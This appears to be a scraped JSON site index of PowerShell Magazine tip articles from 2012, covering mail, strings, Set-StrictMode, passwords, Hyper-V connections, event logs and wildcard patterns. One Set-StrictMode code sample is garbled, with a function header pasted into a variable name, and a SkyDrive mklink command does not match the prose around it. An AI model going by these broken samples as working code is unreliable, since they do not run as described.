Get-ChildItem NoSuchFile -ErrorAction Ignore PS\u0026gt; $error.Count 0 ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/26/pstip-ignoring-errors/","tags":["Tips and Tricks"],"title":"#PSTip Ignoring errors"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nThe Send-MailMessage cmdlet enables you to quickly and easily send e-mail message from within Windows PowerShell. In version 2.0, establishing connections that required alternate port numbers wasn’t possible simply because there wasn’t a way to specify them.\nIn PowerShell 3.0, we now have the Port parameter, together with the UseSsl switch (required to secure the session). You can send an email using your Gmail account.\nThe following example creates a splatting hash table and passes it to the Send-MailMessage cmdlet as one object. Execute the code (change the values to match your own and supply your Gmail credentials when prompted), and then check your email account.\n$param = @{ SmtpServer = 'smtp.gmail.com' Port = 587 UseSsl = $true Credential = 'you@gmail.com' From = 'you@gmail.com' To = 'someone@somewhere.com' Subject = 'Sending emails through Gmail with Send-MailMessage' Body = \u0026quot;Check out the PowerShellMagazine.com website!\u0026quot; Attachments = 'D:\\articles.csv' } Send-MailMessage @param For a PowerShell 2.0 solution, see this forum thread.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/25/pstip-sending-emails-using-your-gmail-account/","tags":["Tips and Tricks"],"title":"#PSTip Sending emails using your Gmail account"},{"categories":["Columns","Tips and Tricks"],"contents":"There are certainly many methods to compare strings in PowerShell.\nToday, I will show you one of the methods that I recently came across — a less known method, maybe.\n\"PowerShell Magazine\".CompareTo(\"PowerShell magazine\")  The output of CompareTo() method will be zero if strings are equal and -1 or 1, otherwise.\nSo, what do you expect as an output for the above command? 0 or 1?\nThe output in this case will be 1. Well, this is because the CompareTo() method does a case sensitive search by default. But, technically, the strings in our example are not different if we discount the case of these strings. So, how do we do a case-insensitive search using CompareTo() method?\nHere’s how:\n[string]::Compare(\"PowerShell Magazine\", \"PowerShell magazine\", $True)  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/24/pstip-different-method-to-compare-strings/","tags":["PowerShell","PSTip"],"title":"#PSTip CompareTo() method for comparing strings!"},{"categories":["Tips and Tricks"],"contents":"Consider the following function:\nfunction test { $myNumbersCollection = 1..5 if($myNfunction test { $myNumbersCollection = 1..5umbersColection -contains 3) { \u0026quot;collection contains 3\u0026quot; } else { \u0026quot;collection doesn't contain 3\u0026quot; } }  By looking at the code it is obvious to the naked eye that the result you should get is: “collection contains 3”. Cool, let’s put this to the test:\nPS\u0026gt; test \u0026quot;collection doesn't contain 3\u0026quot; Ha?! What happened? 3 is in the range of 1 to 5! This is where the Set-StrictMode comes handy. When strict mode is turned on, PowerShell generates a terminating error when the content of an expression, script, or script block violates basic best-practice coding rules.\nOne important thing to keep in mind is that Set-StrictMode affects only the current scope and its child scopes. To debug script blocks, functions or scripts, turn on strict mode at the beginning of each scope.\nfunction test { Set-StrictMode -Version Latest $myNumbersCollection = 1..5 if($myNumbersColection -contains 3) { \u0026quot;collection contains 3\u0026quot; } else { \u0026quot;collection doesn't contain 3\u0026quot; } } PS\u0026gt; test The variable '$myNumbersColection' cannot be retrieved because it has not been set. At line:8 char:8 + if($myNumbersColection -contains 3) + ~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~ + CategoryInfo : InvalidOperation: (myNumbersColection:String) [], RuntimeException + FullyQualifiedErrorId : VariableIsUndefined  A-ha! Now you can see that you actually had a typo and you missed one ‘l’ in the variable name.\nWithout Set-StrictMode turned on in complex and long scripts, you could waste hours to find the typo. Now we can fix the typo and try again:\nfunction test { Set-StrictMode -Version Latest $myNumbersCollection = 1..5 if($myNumbersCollection -contains 3) { \u0026quot;collection contains 3\u0026quot; } else { \u0026quot;collection doesn't contain 3\u0026quot; } } PS\u0026gt; test \u0026quot;collection contains 3\u0026quot;  Now it is working as expected. As a best practice, when authoring script and functions turn on strict mode at the beginning of the code so you can quickly capture those kind of mistakes. Lastly, to turn it off, type:\nPS\u0026gt; Set-StrictMode -Off  For more information, type:\nPS\u0026gt; Get-Help Set-StrictMode -Full   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/23/pstip-set-strictmode-why-should-you-care/","tags":["Tips and Tricks"],"title":"#PSTip Set-StrictMode, why should you care?"},{"categories":["News"],"contents":"Idera, a leading provider of application and server management solutions, today demonstrated its strong commitment to the PowerShell community by making its PowerShell Plus product available for free. This milestone was also marked by the delivery of a new version of the product, PowerShell Plus 4.6.\nPowerShell Plus features a powerful interactive console, an advanced script editor and debugger, and a comprehensive interactive learning center integrated into a single product. It helps administrators and developers quickly learn and master PowerShell, while also dramatically increasing the productivity of expert users. The new version, PowerShell Plus 4.6, has been certified on Windows 8. It includes revised and expanded script libraries for SQL Server and SharePoint 2010. Additionally, the System Explorer now features SQL Server and Share Point 2010 plug-ins that help manage SQL Server instances and SharePoint 2010 farms.\nFor more information and to download PowerShell Plus, please visit http://www.idera.com/Free-Tools/PowerShell-Plus/\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/23/powershell-plus-is-free/","tags":["News"],"title":"PowerShell Plus is Free!"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 and above\nGenerating a password usually consists of creating separate collections containing uppercase letters, lowercase letters, numbers and non-alphanumeric characters (@,%,$,^,\u0026amp;,*, etc…) and then randomizing the collections and pulling a specific number from each collection and then randomizing those into a password.\nA more simple approach is to use the System.Web assembly that can be loaded using Add-Type.\nPS\u0026gt; Add-Type -AssemblyName System.Web  Once loaded, you can make use of the GeneratePassword() from the System.Web.Security.Membership class. This method requires 2 parameters in order to properly create a password string to use. The first parameter is an integer to determine the length of the password which can be between 1 and 128 characters. The second parameter that is required is also an integer to determine the number of non-alphanumeric characters that will be used in the password. This number cannot be greater than the first parameter for the password length, otherwise the operation will fail.\nPS\u0026gt; [System.Web.Security.Membership]::GeneratePassword(15,4) ZU-\u0026amp;o}5O-A*|%%)  Pretty handy to use if you are provisioning a lot of accounts and need to assign a password for each account. Being that this is something that can be quite useful; I wrapped this up into a simple function called New-Password that can be used to generate a password.\nPS\u0026gt; New-Password -PasswordLength 18 -NumNonAlphaNumeric 9 b^}[*cH\u0026gt;jY!D#NU(n\u0026gt; Function New-Password { [cmdletbinding()] Param ( [parameter()] [ValidateRange(1,128)] [Int]$PasswordLength = 15, [parameter()] [Int]$NumNonAlphaNumeric = 7 ) If ($NumNonAlphaNumeric -gt $PasswordLength) { Write-Warning (\"NumNonAlphaNumeric ({0}) cannot be greater than the PasswordLength ({1})!\" -f` $NumNonAlphaNumeric,$PasswordLength) Break } Add-Type -AssemblyName System.Web [System.Web.Security.Membership]::GeneratePassword($PasswordLength,$NumNonAlphaNumeric) }","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/22/pstip-quickly-generate-a-password/","tags":["Tips and Tricks"],"title":"#PSTip Quickly generate a password"},{"categories":["News"],"contents":"Bruce Langworthy, Senior Program Manager with the Storage and FileSystems team at Microsoft, just posted two new PowerShell modules designed to help with the management and diagnosis of Storage Spaces.\nThis module automates deployment of Storage Spaces and provides intent-based management. For example, instead of using many different cmdlets from the Storage module to create a Storage Space, initialize it, partition it, and format it, all of these tasks are performed via a single cmdlet in Windows PowerShell.\nAdditionally these cmdlets will work in conjunction with a Failover Cluster using shared SAS storage with Storage Spaces to create a Cluster Shared Volume (CSV) in a single step as well.\nRead more and download the module here:\nhttp://gallery.technet.microsoft.com/scriptcenter/Storage-Spaces-module-for-4be70a0c\nStorage Spaces Performance Diagnostic This module can be used to diagnose issues where one or more disks in a Storage Pool are performing abnormally, which are resulting in a Storage Space performing slowly.\nRead more, and download this module here:\nhttp://gallery.technet.microsoft.com/scriptcenter/Storage-Spaces-Performance-9366b756\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/20/two-new-powershell-modules-related-to-storage-spaces/","tags":["News"],"title":"Two new PowerShell modules related to Storage Spaces"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 and above\nIf you only like to know if a computer can be contacted across a network, you can use the Test-Connection cmdlet with the –Quiet parameter. You can even send only one echo request packet (ping) to the computer by using -Count 1.\nThis is much faster than executing Test-Connection without any parameters (which sends 4 echo requests by default), but if you have an unstable network connection or the computer is very busy, the ping reply can get lost!\nTo solve this situation, you can send more than one test which cost more time to wait for. To get the fastest reply possible, you can use a loop with a break or a function with a return statement, to get the earliest possible response. The delay time between every echo request in the Test-Connection cmdlet is set to the time interval in seconds. If you like to lower this interval you can use the Start-Sleep command.\nFunction Test-ConnectionQuietFast { [CmdletBinding()] param( [String]$ComputerName, [int]$Count = 1, [int]$Delay = 500 ) for($I = 1; $I -lt $Count + 1 ; $i++) { Write-Verbose \u0026quot;Ping Computer: $ComputerName, $I try with delay $Delay milliseconds\u0026quot; # Test the connection quiet to the computer with one ping If (Test-Connection -ComputerName $ComputerName -Quiet -Count 1) { # Computer can be contacted, return $True Write-Verbose \u0026quot;Computer: $ComputerName is alive! With $I ping tries and a delay of $Delay milliseconds\u0026quot; return $True } # delay between each pings Start-Sleep -Milliseconds $Delay } # Computer cannot be contacted, return $False Write-Verbose \u0026quot;Computer: $ComputerName cannot be contacted! With $Count ping tries and a delay of $Delay milliseconds\u0026quot; $False } # Example: Test-ConnectionQuietFast -ComputerName localhost -Count 3 -Delay 300 –Verbose ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/19/pstip-how-to-speed-up-the-test-connection-command/","tags":["Tips and Tricks"],"title":"#PSTip How to speed up the Test-Connection command"},{"categories":["Tips and Tricks"],"contents":"With the PowerStatus class we can quickly get the information status of the current system. The PowerStatus class represents information about the current AC line power status, battery charging status, and battery charge status. To use PowerStatus class we first need to load the System.Windows.Forms assembly (in ISE it is already loaded so you skip the Add-type command):\nPS\u0026gt; Add-Type -Assembly System.Windows.Forms PS\u0026gt; [System.Windows.Forms.SystemInformation]::PowerStatus PowerLineStatus : Offline BatteryChargeStatus : High BatteryFullLifetime : -1 BatteryLifePercent : 0.76 BatteryLifeRemaining : 9500 Here’s a breakdown of the properties of the class:\nPowerLineStatus Gets the current system power status. Indicates whether the system power is online, or that the system power status is unknown. Possible values:\n Offline – The system is offline. Online – The system is online. Unknown – The power status of the system is unknown.  BatteryChargeStatus Gets the current battery charge status. Possible values:\n High -Indicates a high level of battery charge. Low – Indicates a low level of battery charge. Critical – Indicates a critically low level of battery charge. Charging – Indicates a battery is charging. NoSystemBattery – Indicates that no battery is present. Unknown – Indicates an unknown battery condition.  BatteryFullLifetime Gets the reported full charge lifetime of the primary battery power source in seconds. The reported number of seconds of battery life available when the battery is fully charged, or -1 if the battery life is unknown.\nBatteryLifePercent Gets the approximate amount of full battery charge remaining. The approximate amount, from 0.0 to 1.0, of full battery charge remaining.\nBatteryLifeRemainingGets The approximate number of seconds of battery life remaining, or –1 if the approximate remaining battery life is unknown. To get the value in hours:\nPS\u0026gt; 9500/60/60 2.63888888888889   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/18/pstip-get-system-power-information/","tags":["Tips and Tricks"],"title":"#PSTip Get system power information"},{"categories":["Tips and Tricks"],"contents":"Sometimes you need to wait for an executable to finish its job. The typical case is a Setup.exe, but this behavior is also ideal candidate for cleaning up temporary files after an application has been closed. Powershell makes this easy; just redirect the output to a (valid) pipe.\n\u0026amp; 'C:\\Program Files\\Internet Explorer\\iexplore.exe' | echo \u0026quot;Waiting.\u0026quot; \u0026quot;Internet Explorer has been closed.\u0026quot; Please notice that the invoke operator ‘\u0026amp;’ is used, and that the “Waiting.” message is not shown in the Powershell output.\nThe typical case is waiting for setup.exe or msiexec.exe to finish, but the behavior is also useful for tasks like cleaning up temporary files or starting external applications one after another.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/17/pstip-wait-for-executable-to-finish/","tags":["Tips and Tricks"],"title":"#PSTip Wait for executable to finish"},{"categories":["Tips and Tricks"],"contents":"To convert a number to its equivalent binary string representation, use the Convert.ToString method with a base of 2.\nPS\u0026gt; [Convert]::ToString(192,2) 11000000  To convert a binary number into its decimal representation, use the Convert.ToInt32 method with a base of 2 :\nPS\u0026gt; [Convert]::ToInt32('11000000',2) 192  Binary conversions are usually used in IP addressing and subnetting calculations. Here’s an example of converting an IP address to its binary representation and back.\n$ip = '192.168.10.1' # convert to binary form $bin = $ip -split '\\.' | ForEach-Object { [System.Convert]::ToString($_,2).PadLeft(8,'0') } # print result $bin 11000000 10101000 00001010 00000001 # join the objects $bin -join '.' 11000000.10101000.00001010.00000001 # convert the result back to decimal $dec = $bin | ForEach-Object { [System.Convert]::ToByte($_,2) } # print result $dec 192 168 10 1 # join the result to form a valid IP Address $dec -join '.' 192.168.10.1 ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/16/converting-numbers-to-binary-and-back/","tags":["Tips and Tricks"],"title":"#PSTip Converting numbers to binary and back"},{"categories":["How To"],"contents":"I while back I was asked if it is possible to use SkyDrive to sync the WindowsPowerShell folder between multiple machines. Not using SkyDrive at that time myself I did not know if it was possible, but I assumed it was.\nI set out to test it, I’ve installed SkyDrive on my main Windows 7 workstation and a test machine, and then logged in with my LiveID on both machines. After installation, SkyDrive created a SkyDrive folder under C:\\Users%UserName%. My initial thought was to go into that folder and create a symlink pointing to C:\\Users%UserName%\\Documents\\WindowsPowerShell.\nI started an elevated command prompt, navigated to C:\\Users%UserName%\\SkyDrive and did:\nmklink /d \"WindowsPowerShell\" C:\\Users\\%Username%\\Documents\\WindowsPowershell  That created a symlink in the SkyDrive folder that pointed to C:\\Users%UserName%\\Documents\\WindowsPowerShell. I went to the test machine, but nothing was synced over. From this test I could deduce that SkyDrive did not follow symlinks to sync data.\nMy next test was to “reverse” my steps and try to create a “WindowsPowerShell” symlink in C:\\Users%Username%\\Documents\\ and point that to the SkyDrive folder.\nIn my C:\\Users%UserName%\\SkyDrive folder I created two folders \\Documents\\WindowsPowerShell, so I ended up with C:\\Users%UserName%\\SkyDrive\\Documents\\WindowsPowerShell\nIn the elevated cmd prompt I navigated to C:\\Users%Username%\\Documents\\ and tried to do:\nmklink /d \"WindowsPowerShell\" C:\\Users\\%UserName%\\skydrive\\Documents\\WindowsPowershell  That failed with an error saying: Folder already exists.\nWhich makes sense, since you cannot have a symlink and a folder with the same name, so I copied the contents from C:\\Users%Username%\\Documents\\WindowsPowershell to C:\\Users%UserName%\\skydrive\\Documents\\WindowsPowerShell\nI renamed the WindowsPowerShell folder in C:\\Users%Username%\\Documents\\WindowsPowerShell to WindowsPowerShellOld, and ran the following command again. It completed without any errors.\nmklink /d \"WindowsPowerShell\" C:\\Users\\%UserName%\\skydrive\\Documents\\WindowsPowerShell  Now in my Documents folder I have a symlink named WindowsPowerShell pointing to C:\\Users%UserName%\\SkyDrive\\Documents\\WindowsPowerShell where the actual WindowsPowerShell folder containing my profile.ps1 and my modules is located.\nSo to summarize   Install SkyDrive on both machines.\n  On your main machine, create two folders in your SkyDrive folder, one called Documents and beneath that one called WindowsPowerShell, you should see an empty folder synced to the second machine. (You could name it anything you like)\n  Mkdir C:\\Users\\%UserName%\\SkyDrive\\Documents\\WindowsPowerShell  Trick Windows to go look for profiles/modules etc, in %Username%\\SkyDrive\\Documents\\WindowsPowerShell instead of %username%\\Documents\\WindowsPowerShell. To do that, create a symlink called “WindowsPowerShell” in %username\\Documents pointing to %Username%\\SkyDrive\\Documents\\WindowsPowerShell.But since you already run Powershell and have a folder called %Username%\\Documents\\WindowsPowerShell it will fail. So you have to rename that folder, and let mklink create the symlink called “WindowsPowerShell\u0026rdquo;  robocopy C:\\Users\\%UserName%\\Documents\\WindowsPowerShell C:\\Users\\%UserName%\\SkyDrive\\Documents\\WindowsPowerShell /MIR ren C:\\Users\\%UserName%\\Documents\\WindowsPowerShell C:\\Users\\%UserName%\\Documents\\ WindowsPowerShellOLD mklink /d \u0026quot;C:\\Users\\%UserName%\\Documents\\WindowsPowerShell\\WindowsPowerShell1\u0026quot; C:\\Users\\%UserName%\\skydrive\\Documents\\WindowsPowerShell   Now you have what appears to be a folder in %Username%\\Documents called WindowsPowerShell, but is actually a symlink redirecting you to the Documents\\WindowsPowerShell folder in you SkyDrive folder.\n  Test it. Create a folder/file on one machine and you should see it synced on the other machine.\n  I tested that PowerShell worked, by seeing that my profile got loaded, and I had access to my modules. Then I did the same on the test machine, and voila I had set up sync between my two machines. To test that it actually worked, I tried altering a few lines in my profiles.ps1 on the test machine, it was almost instantaneously synced to my primary machine.\nA few words of caution if you are doing this as well, if you delete a file on one machine, it will be deleted everywhere, if you change a file it will changed everywhere.. So before you go and sync your folders, make sure you continuously backup your WindowsPowerShell folder somewhere outside of SkyDrive’s reach.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/16/using-skydrive-to-sync-your-windowspowershell-folder/","tags":["How To"],"title":"Using SkyDrive to sync your WindowsPowerShell folder"},{"categories":["Tips and Tricks"],"contents":"Have you ever wondered how often is your station rebooted? Let’s ask the Windows Event Log and get time of last five reboots. You will use the Get-WinEvent cmdlet to connect to System event log. You are interested in “The Event log service was started.” event which has Id 6005. Let’s build a nice little XML query using here-string:\n$xml=@' \u0026lt;QueryList\u0026gt; \u0026lt;Query Id=\u0026quot;0\u0026quot; Path=\u0026quot;System\u0026quot;\u0026gt; \u0026lt;Select Path=\u0026quot;System\u0026quot;\u0026gt;*[System[(EventID=6005)]]\u0026lt;/Select\u0026gt; \u0026lt;/Query\u0026gt; \u0026lt;/QueryList\u0026gt; '@ PS\u0026gt; Get-WinEvent -FilterXml $xml -MaxEvents 5 ProviderName: EventLog TimeCreated Id LevelDisplayName Message ----------- -- ---------------- ------- 10/8/2012 2:12:32 PM 6005 Information The Event log service was started. 10/8/2012 10:52:34 AM 6005 Information The Event log service was started. 10/8/2012 9:56:53 AM 6005 Information The Event log service was started. 10/5/2012 11:53:52 AM 6005 Information The Event log service was started. 10/4/2012 4:30:08 PM 6005 Information The Event log service was started. There is of course a 6006 event if you are more interested in shutdowns.\nAnother thing to notice is that the cmdlet itself implements a possibility to access event log on remote computers, making it an ideal tool for creating remote statistics.\nPS\u0026gt; Get-WinEvent -FilterXml $xml -MaxEvents 5 -ComputerName Server01,Server02   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/15/pstip-get-your-reboot-history/","tags":["Tips and Tricks"],"title":"#PSTip Get your reboot history"},{"categories":["Tips and Tricks"],"contents":"PowerShell can convert Hexadecimal numbers on the command line, just prefix the value with ‘0x’:\nPS\u0026gt; 0xAE 174  Converting a number to HEX requires the use of .NET string formatting. Here we use the ‘x’ format specifier, it converts a number to a string of hexadecimal digits and the result is a hexadecimal string :\nPS\u0026gt; '{0:x}' -f 174 ae  The result is a HEX value in lower case. You can have the result in upper case by using ‘X’ instead, and also have a specific number of digits in the result by using a precision specifier. If required, the number is padded with zeros to its left to produce the number of digits given by the precision specifier.\nPS\u0026gt; '{0:X4}' -f 174 00AE  See this page for more information on .NET Numeric Format Strings \n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/12/pstip-converting-numbers-to-hex/","tags":["Tips and Tricks"],"title":"#PSTip Converting numbers to HEX"},{"categories":["Hyper-V"],"contents":"I’ve been using Windows 8 since its pre-release versions and one of the features I like most in it is – Hyper-V. Until Windows 8, Hyper-V was available only as a Server technology. Starting with Windows 8, it is now available out of the box!\nIn a nutshell, Hyper-V lets you run more than one 32-bit or 64-bit operating system at the same time on the same computer. In Windows 8, this technology is now built into the non-server version of Windows. Client Hyper-V provides the same virtualization capabilities as Hyper-V in Windows Server 2012.\nFor us, IT Pros, having a virtualized environment nowadays is almost a necessity as many of us need to run multiple operating systems, and maintain multiple test environments. Hyper-V is an optional feature. You must first enable it.\nNote: Client Hyper-V is supported only on 64-bit versions of Windows 8, Pro or Enterprise, having at least 4 GB of RAM, and requires modern Intel and AMD microprocessors that include Second Level Address Translation (SLAT) technologies.\nEnable Hyper-V using the UI On the Control Panel, click Programs, and then click Programs and Features, click ‘Turn Windows features on or off’, tick the Hyper-V checkbox , click OK, and then click Close.\nEnable Client Hyper-V using Windows PowerShell Open Windows PowerShell and type the following command (which is a part of the Dism module):\nEnable-WindowsOptionalFeature –FeatureName Microsoft-Hyper-V -All  To complete installation you need to restart your computer. After restarting the computer, you can use Hyper-V Manager or Windows PowerShell to create and manage virtual machines. You can also use Virtual Machine Connection (vmc) to connect to virtual machines locally or remotely.\nConnecting to Virtual Machines You can connect to your VMs by using the Virtual Machine Connection utility. Notice the warning at the bottom of the dialog. I launched it without administrative privileges and as a result I won’t be able to connect to VMs. Make sure you right click it and open it as an administrator.\nThat warning is also valid when you use the Hyper-V cmdlets, and the error you get back is misleading; it doesn’t mention required permissions whatsoever. For example, if you run the Get-VM from a non-elevated console:\nPS\u0026gt; Get-VM -VMName DC12 Get-VM :The parameter is not valid. Hyper-V was unable to find a virtual machine with name DC12. At line:1 char:1 + Get-VM -VMName DC12 + CategoryInfo : InvalidArgument: (DC12:String) [Get-VM], VirtualizationInvalidArgumentException + FullyQualifiedErrorId : InvalidParameter,Microsoft.HyperV.PowerShell.Commands.GetVMCommand Alternatively, you can use the Hyper-V Manager. Just right click a VM and then ‘Connect’:\nThe Hyper-V module for Windows PowerShell The Hyper-V module for Windows PowerShell includes more than 160 cmdlets to manage Hyper-V virtual machines. The cmdlets provide an easy way to automate Hyper-V management tasks. Here’s a partial list of the module commands:\nPS\u0026gt; Get-Command -Module Hyper-V CommandType Name ModuleName ----------- ---- ---------- Cmdlet Add-VMDvdDrive hyper-v Cmdlet Add-VMFibreChannelHba hyper-v Cmdlet Add-VMHardDiskDrive hyper-v Cmdlet Add-VMMigrationNetwork hyper-v Cmdlet Add-VMNetworkAdapter hyper-v Cmdlet Add-VMNetworkAdapterAcl hyper-v Cmdlet Add-VMRemoteFx3dVideoAdapter hyper-v Cmdlet Add-VMScsiController hyper-v Cmdlet Add-VMStoragePath hyper-v Cmdlet Add-VMSwitch hyper-v Cmdlet Add-VMSwitchExtensionPortFeature hyper-v Cmdlet Add-VMSwitchExtensionSwitchFeature hyper-v Cmdlet Checkpoint-VM hyper-v Cmdlet Compare-VM hyper-v Cmdlet Complete-VMFailover hyper-v Cmdlet Connect-VMNetworkAdapter hyper-v Cmdlet Connect-VMSan hyper-v Cmdlet Convert-VHD hyper-v Cmdlet Disable-VMEventing hyper-v (...)  The online reference of the Hyper-V cmdlets in Windows PowerShell can be found here: http://technet.microsoft.com/library/hh848559.aspx\nOne of the first things I’ve tried when working with Hyper-V was to connect to a VM via PowerShell but I couldn’t find a Connect-VM cmdlet!\nUnder the hood, Hyper-V Manager is using the vmc utility (vmconnect.exe) to connect to a VM.\nBased on the parameters of vmc, I created the Connect-VM advanced function. With Connect-VM, you can connect to a VM, locally or on a remote machine and even start it, if it isn’t already running. You can pipe VMs you get with Get-VM to it or just specify the VM name(s) or GUIDs. And with a few modifications you can also extend it to launch Remote Desktop instead of Hyper-V.\n#requires -Version 3.0 function Connect-VM { [CmdletBinding(DefaultParameterSetName='name')] param( [Parameter(ParameterSetName='name')] [Alias('cn')] [System.String[]]$ComputerName=$env:COMPUTERNAME, [Parameter(Position=0, Mandatory,ValueFromPipelineByPropertyName, ValueFromPipeline,ParameterSetName='name')] [Alias('VMName')] [System.String]$Name, [Parameter(Position=0, Mandatory,ValueFromPipelineByPropertyName, ValueFromPipeline,ParameterSetName='id')] [Alias('VMId','Guid')] [System.Guid]$Id, [Parameter(Position=0,Mandatory, ValueFromPipeline,ParameterSetName='inputObject')] [Microsoft.HyperV.PowerShell.VirtualMachine]$InputObject, [switch]$StartVM ) begin { Write-Verbose \u0026quot;Initializing InstanceCount, InstanceCount = 0\u0026quot; $InstanceCount=0 } process { try { foreach($computer in $ComputerName) { Write-Verbose \u0026quot;ParameterSetName is '$($PSCmdlet.ParameterSetName)'\u0026quot; if($PSCmdlet.ParameterSetName -eq 'name') { # Get the VM by Id if Name can convert to a guid if($Name -as [guid]) { Write-Verbose \u0026quot;Incoming value can cast to guid\u0026quot; $vm = Get-VM -Id $Name -ErrorAction SilentlyContinue } else { $vm = Get-VM -Name $Name -ErrorAction SilentlyContinue } } elseif($PSCmdlet.ParameterSetName -eq 'id') { $vm = Get-VM -Id $Id -ErrorAction SilentlyContinue } else { $vm = $InputObject } if($vm) { Write-Verbose \u0026quot;Executing 'vmconnect.exe $computer $($vm.Name) -G $($vm.Id) -C $InstanceCount'\u0026quot; vmconnect.exe $computer $vm.Name -G $vm.Id -C $InstanceCount } else { Write-Verbose \u0026quot;Cannot find vm: '$Name'\u0026quot; } if($StartVM -and $vm) { if($vm.State -eq 'off') { Write-Verbose \u0026quot;StartVM was specified and VM state is 'off'. Starting VM '$($vm.Name)'\u0026quot; Start-VM -VM $vm } else { Write-Verbose \u0026quot;Starting VM '$($vm.Name)'. Skipping, VM is not not in 'off' state.\u0026quot; } } $InstanceCount+=1 Write-Verbose \u0026quot;InstanceCount = $InstanceCount\u0026quot; } } catch { Write-Error $_ } } }  Usage examples # Connect to VM and start it PS\u0026gt; Connect-VM -VMName DC12 -StartVM Connecting to multiple VMs, when multiple connections are made the windows are cascaded. Without it they would sit on top of each other at the same position making it hard to switch from one to another.  PS\u0026gt; Get-VM | Connect-VM  Connect using a VM’s Guid  PS\u0026gt; Connect-VM -Id 34d22d46-15c7-4226-9fa2-04f6c90a5a9a -StartVM  You can download the function HERE\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/11/connecting-to-hyper-v-virtual-machines-with-powershell/","tags":["Hyper-V"],"title":"Connecting to Hyper-V virtual machines with PowerShell"},{"categories":["How To"],"contents":"Many Windows PowerShell cmdlets support wildcard characters for their parameter values. For example, almost every cmdlet that has the Name or Path parameter supports wildcard characters for these parameters. When writing scripts, you often need to design a function or a script that can run against a group of resources rather than against a single resource. In such cases you must provide support for wildcard characters. Inside your function you might want to know if the argument you get for a wildcard parameter actually contains wildcard characters.\nNote: The process of using wildcard characters is sometimes referred to as globbing.\nWildcardPattern Static methods The System.Management.Automation namespace has a WildcardPattern class that represents a wildcard pattern that is used for matching. We can use its static members to escape (adding a backtick character in front of wildcard characters) or unescape wildcard patterns or check if a given string has any wildcard characters in it.\nPS\u0026gt; [System.Management.Automation.WildcardPattern] | Get-Member -Static TypeName: System.Management.Automation.WildcardPattern Name MemberType Definition ---- ---------- ---------- ContainsWildcardCharacters Method static bool ContainsWildcardCharacters(string pattern) Equals Method static bool Equals(System.Object objA, System.Object objB) Escape Method static string Escape(string pattern) ReferenceEquals Method static bool ReferenceEquals(System.Object objA, System.Object objB) Unescape Method static string Unescape(string pattern) # check if a given string has any wildcard characters in it PS\u0026gt; $pattern = 's?[cn]*' PS\u0026gt; [System.Management.Automation.WildcardPattern]::ContainsWildcardCharacters($pattern) True # escape the pattern, interpret it literally PS\u0026gt; [System.Management.Automation.WildcardPattern]::Escape($pattern) s`?`[cn`]`* # unescape PS\u0026gt; [System.Management.Automation.WildcardPattern]::Unescape('s`?`[cn`]`*') s?[cn] Creating WildcardPattern objects The WildcardPattern class has also Instance methods. Using New-Object, we can instantiate the class with a string pattern and access the instance methods:\nPS\u0026gt; New-Object System.Management.Automation.WildcardPattern -ArgumentList $pattern | Get-Member TypeName: System.Management.Automation.WildcardPattern Name MemberType Definition ---- ---------- ---------- Equals Method bool Equals(System.Object obj) GetHashCode Method int GetHashCode() GetType Method type GetType() IsMatch Method bool IsMatch(string input) ToString Method string ToString() ToWql Method string ToWql() With the IsMatch method we can determine if the supplied string matches the wildcard pattern you specified as an argument. The ToWql method, as its name implies, converts the pattern to a WMI Query Language (WQL) filter.\nIf not stated otherwise, wildcard pattern matching is performed on a case-insensitive basis. You can also create a case-insensitive pattern using another constructor by passing a WilcardOptions object. The following command creates a case-insensitive pattern that ignores cultural differences.\nNew-Object System.Management.Automation.WildcardPattern -ArgumentList $pattern,'IgnoreCase,CultureInvariant'  Putting it all together, you can get a string, check if it contains wildcard characters, and if so convert it to WQL (WMI Query Language) so the result can be used in a WMI filter.\nLet’s see which process names match our pattern. The pattern, ‘s?[cn]*’, starts with the letter ‘s’, then it should match any single character (e.g ?), then the letter ‘c’ or ‘n’, and zero or more characters (e.g *)\nPS\u0026gt; Get-Process -Name $pattern | Format-Table Name Name ---- svchost svchost svchost svchost svchost svchost svchost svchost svchost svchost svchost SyncServer SynTPEnh SynTPHelper SynTPLpr As you can see all process names match the pattern. Now let’s try to convert it to WQL and use it with the Get-WmiObject cmdlet.\nWe’ll start by checking if the pattern contains wildcard characters, if so, the converted pattern will be written to the console, the wildcard pattern will be converted to WQL so you get all processes that match the pattern\n$IsWP = [System.Management.Automation.WildcardPattern]::ContainsWildcardCharacters($pattern) if($IsWP) { $wp= (New-Object System.Management.Automation.WildcardPattern -ArgumentList $pattern) $wqlPattern = $wp.ToWql() Write-Host \u0026quot;WilcardPattern '$wildcard' in WQL is: '$wqlPattern'\u0026quot; Get-WmiObject -Class Win32_Process -Filter \u0026quot;Name LIKE '$wqlPattern '\u0026quot; | Format-Table Name } WilcardPattern 's?[cn]*' in WQL is: 's_[cn]%' Name ---- svchost.exe svchost.exe svchost.exe svchost.exe svchost.exe svchost.exe svchost.exe svchost.exe svchost.exe svchost.exe svchost.exe SynTPEnh.exe 